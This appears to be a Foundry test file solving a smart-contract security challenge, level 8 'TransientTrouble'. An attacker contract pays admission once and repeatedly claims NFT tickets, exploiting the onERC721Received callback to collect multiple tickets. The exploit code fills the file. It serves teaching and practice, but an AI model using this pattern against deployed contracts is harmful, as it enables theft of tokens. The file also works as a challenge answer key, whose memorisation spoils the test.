// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.25;

import {ExclusiveClub} from "../src/8_TransientTrouble.sol";
import {TransientTroubleHelper} from "../test_helper/8_TransientTroubleSetup.sol";
import {Test, console2} from "forge-std/Test.sol";
import "../mocks/NFT.sol";
import "@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol";

contract Hek is IERC721Receiver {
    ExclusiveClub DaClub;
    NFT nftContract;
    address hacker;

    constructor(address _daClub, address _ticket, address _hacker) {
        DaClub = ExclusiveClub(_daClub);
        nftContract = NFT(_ticket);
        hacker = _hacker;
    }

    function atek() public payable {
        DaClub.payAdmission{value: msg.value}();
        DaClub.receiveTicket();
        DaClub.receiveTicket();
        DaClub.receiveTicket();
    }

    function transferTickets(uint256 tokenId) public {
        nftContract.safeTransferFrom(address(this), hacker, tokenId);
    }

    function onERC721Received(address operator, address from, uint256 tokenId, bytes calldata data)
        external
        returns (bytes4)
    {
        nftContract.safeTransferFrom(address(this), hacker, tokenId);
        return IERC721Receiver.onERC721Received.selector;
    }
}

contract TransientTrouble is Test {
    NFT public ticket;
    ExclusiveClub daClub;

    function setUp() public {
        TransientTroubleHelper dontpeak = new TransientTroubleHelper();
        daClub = dontpeak.deployed();
        ticket = dontpeak.ticket();
    }

    function convertToString(uint256 num) public pure returns (string memory) {
        string memory strNum; // define string type memory variable
        strNum = Strings.toString(num); // converts unsigned int to a string
        return strNum; // return string
    }

    function test_GetThisPassing_8() public {
        address hacker = address(0xBAD);

        vm.startPrank(hacker);
        Hek hek = new Hek(address(daClub), address(ticket), hacker);
        hek.atek{value: daClub.ticketCost()}();

        hek.transferTickets(0);
        hek.transferTickets(1);
        hek.transferTickets(2);

        vm.stopPrank();

        assertGt(ticket.balanceOf(hacker), 2);
    }
}
